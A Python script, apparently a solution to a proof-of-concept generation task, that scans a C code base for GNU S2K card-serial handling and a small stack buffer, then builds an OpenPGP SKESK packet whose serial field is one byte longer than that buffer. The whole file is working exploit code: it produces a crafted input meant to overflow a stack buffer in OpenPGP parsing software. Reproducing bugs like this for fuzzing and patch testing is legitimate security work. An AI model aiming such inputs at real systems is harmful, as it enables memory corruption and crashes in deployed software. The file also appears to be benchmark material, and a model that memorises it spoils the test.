import os
import re
import tarfile
import tempfile
from typing import Dict, List, Optional, Tuple


class Solution:
    def _read_sources_from_tar(self, tar_path: str) -> Dict[str, bytes]:
        src: Dict[str, bytes] = {}
        with tarfile.open(tar_path, "r:*") as tf:
            for m in tf.getmembers():
                if not m.isfile():
                    continue
                name = m.name
                lower = name.lower()
                if not (lower.endswith(".c") or lower.endswith(".h") or lower.endswith(".cc") or lower.endswith(".cpp") or lower.endswith(".inc")):
                    continue
                if m.size <= 0 or m.size > 2_000_000:
                    continue
                f = tf.extractfile(m)
                if not f:
                    continue
                try:
                    data = f.read()
                finally:
                    f.close()
                src[name] = data
        return src

    def _read_sources_from_dir(self, root: str) -> Dict[str, bytes]:
        src: Dict[str, bytes] = {}
        for dirpath, _, filenames in os.walk(root):
            for fn in filenames:
                lower = fn.lower()
                if not (lower.endswith(".c") or lower.endswith(".h") or lower.endswith(".cc") or lower.endswith(".cpp") or lower.endswith(".inc")):
                    continue
                path = os.path.join(dirpath, fn)
                try:
                    st = os.stat(path)
                except OSError:
                    continue
                if st.st_size <= 0 or st.st_size > 2_000_000:
                    continue
                try:
                    with open(path, "rb") as f:
                        data = f.read()
                except OSError:
                    continue
                rel = os.path.relpath(path, root)
                src[rel] = data
        return src

    def _load_sources(self, src_path: str) -> Dict[str, bytes]:
        if os.path.isdir(src_path):
            return self._read_sources_from_dir(src_path)
        return self._read_sources_from_tar(src_path)

    def _parse_macros(self, sources: Dict[str, bytes]) -> Dict[str, int]:
        macros: Dict[str, int] = {}
        define_re = re.compile(r"^\s*#\s*define\s+([A-Za-z_][A-Za-z0-9_]*)\s+((?:0x)?[0-9A-Fa-f]+)\b")
        for data in sources.values():
            try:
                text = data.decode("latin1", errors="ignore")
            except Exception:
                continue
            for line in text.splitlines():
                m = define_re.match(line)
                if not m:
                    continue
                name = m.group(1)
                val_s = m.group(2)
                try:
                    val = int(val_s, 0)
                except Exception:
                    continue
                if 0 <= val <= 1_000_000:
                    macros[name] = val
        return macros

    def _guess_gnu_mode_offset(self, sources: Dict[str, bytes]) -> int:
        # Typical: s2k->mode = 1000 + s2k->salt[4]
        patterns = [
            re.compile(r"\bmode\s*=\s*(\d+)\s*\+\s*[^;\n]*salt\s*\[\s*4\s*\]", re.IGNORECASE),
            re.compile(r"\bmode\s*=\s*(\d+)\s*\+\s*[^;\n]*salt\s*\[\s*5\s*\]", re.IGNORECASE),
            re.compile(r"\bmode\s*=\s*(\d+)\s*\+\s*[^;\n]*salt\s*\[\s*6\s*\]", re.IGNORECASE),
            re.compile(r"\bmode\s*=\s*(\d+)\s*\+\s*[^;\n]*salt\s*\[\s*7\s*\]", re.IGNORECASE),
            re.compile(r"\bs2k->mode\s*=\s*(\d+)\s*\+\s*[^;\n]*salt\s*\[\s*4\s*\]", re.IGNORECASE),
        ]
        for data in sources.values():
            try:
                text = data.decode("latin1", errors="ignore")
            except Exception:
                continue
            if "GNU" not in text and "gnu" not in text:
                continue
            for pat in patterns:
                m = pat.search(text)
                if m:
                    try:
                        off = int(m.group(1))
                        if 0 <= off <= 10000:
                            return off
                    except Exception:
                        pass
        return 1000

    def _choose_salt_mode_byte(self, macros: Dict[str, int], offset: int) -> int:
        cands: List[Tuple[int, int]] = []
        for k, v in macros.items():
            ku = k.upper()
            if "S2K" not in ku:
                continue
            if not any(x in ku for x in ("CARD", "DIVERT", "SERIAL", "SERNO", "SMARTCARD")):
                continue
            pr = 10
            if "DIVERT" in ku and "CARD" in ku:
                pr = 0
            elif "CARD" in ku:
                pr = 1
            elif "SMARTCARD" in ku:
                pr = 2
            elif "SERIAL" in ku or "SERNO" in ku:
                pr = 3
            cands.append((pr, v))

        if cands:
            cands.sort(key=lambda x: (x[0], x[1]))
            mode_total = cands[0][1]
        else:
            # Fallback: common divert-to-card is 1002 or 2
            mode_total = offset + 2

        if mode_total >= offset and mode_total <= offset + 255:
            mode_byte = mode_total - offset
        else:
            mode_byte = mode_total

        if not (1 <= mode_byte <= 255):
            mode_byte = 2
        return mode_byte

    def _resolve_size_token(self, tok: str, macros: Dict[str, int]) -> Optional[int]:
        tok = tok.strip()
        if not tok:
            return None
        if tok.isdigit():
            try:
                return int(tok)
            except Exception:
                return None
        if tok.startswith("0x") or tok.startswith("0X"):
            try:
                return int(tok, 16)
            except Exception:
                return None
        if tok in macros:
            return macros[tok]
        return None

    def _find_serial_stack_buf_size(self, sources: Dict[str, bytes], macros: Dict[str, int]) -> Optional[int]:
        # Try to find a small fixed array involving "serial" near S2K/GNU parsing.
        decl_re = re.compile(
            r"\b(?:unsigned\s+char|signed\s+char|char|u8|byte|uchar)\s+([A-Za-z_][A-Za-z0-9_]*serial[A-Za-z0-9_]*)\s*\[\s*([A-Za-z0-9_]+)\s*\]",
            re.IGNORECASE,
        )
        sizes: List[int] = []

        for data in sources.values():
            low = data.lower()
            if b"serial" not in low:
                continue
            if b"s2k" not in low and b"gnu" not in low:
                continue
            try:
                text = data.decode("latin1", errors="ignore")
            except Exception:
                continue
            for m in decl_re.finditer(text):
                tok = m.group(2)
                sz = self._resolve_size_token(tok, macros)
                if sz is None:
                    continue
                if 1 <= sz <= 256:
                    sizes.append(sz)

        if sizes:
            # Prefer small likely stack buffers
            sizes.sort()
            for sz in sizes:
                if 4 <= sz <= 64:
                    return sz
            return sizes[0]
        return None

    def _find_fuzzer_kind(self, sources: Dict[str, bytes]) -> str:
        # If we can infer a fuzz harness, decide whether it expects packet data.
        fuzzer_files = []
        for name, data in sources.items():
            if b"LLVMFuzzerTestOneInput" in data or b"FuzzerTestOneInput" in data:
                fuzzer_files.append((name, data))
        if not fuzzer_files:
            return "openpgp"

        for _, data in fuzzer_files:
            low = data.lower()
            if b"parse_packet" in low or b"openpgp" in low or b"pkt_" in low or b"list-packets" in low:
                return "openpgp"
            if (b"s2k" in low) and (b"read_s2k" in low or b"parse_s2k" in low):
                return "s2k"

        return "openpgp"

    def _openpgp_new_packet(self, tag: int, body: bytes) -> bytes:
        first = 0xC0 | (tag & 0x3F)
        l = len(body)
        if l < 192:
            return bytes([first, l]) + body
        if l < 8384:
            x = l - 192
            return bytes([first, (x >> 8) + 192, x & 0xFF]) + body
        return bytes([first, 0xFF]) + l.to_bytes(4, "big") + body

    def solve(self, src_path: str) -> bytes:
        sources = self._load_sources(src_path)
        macros = self._parse_macros(sources)
        offset = self._guess_gnu_mode_offset(sources)
        mode_byte = self._choose_salt_mode_byte(macros, offset)

        buf_sz = self._find_serial_stack_buf_size(sources, macros)
        if buf_sz is None or buf_sz <= 0 or buf_sz > 240:
            buf_sz = 9  # Matches typical minimal PoC size assumptions for this bug class

        serial_len = buf_sz + 1
        if serial_len > 250:
            serial_len = 250

        salt = b"GNU" + bytes([0x01, mode_byte]) + b"\x00\x00\x00"  # 8 bytes total
        # SKESK packet (tag 3) with iterated+salted S2K (type 3)
        # Extra bytes used by GNU S2K extensions for card-related data.
        body = (
            bytes([0x04, 0x07, 0x03, 0x02])  # ver=4, sym=AES128, s2k-type=3, hash=SHA1
            + salt
            + bytes([0x00])  # count
            + bytes([serial_len])
            + (b"A" * serial_len)
            + bytes([0x00])  # keyref length = 0
        )

        kind = self._find_fuzzer_kind(sources)
        if kind == "s2k":
            # Provide raw S2K blob: type, hash, salt, count, serial-len, serial, keyref-len
            return body[2:]  # drop version+sym if present; keep s2k onwards
        return self._openpgp_new_packet(3, body)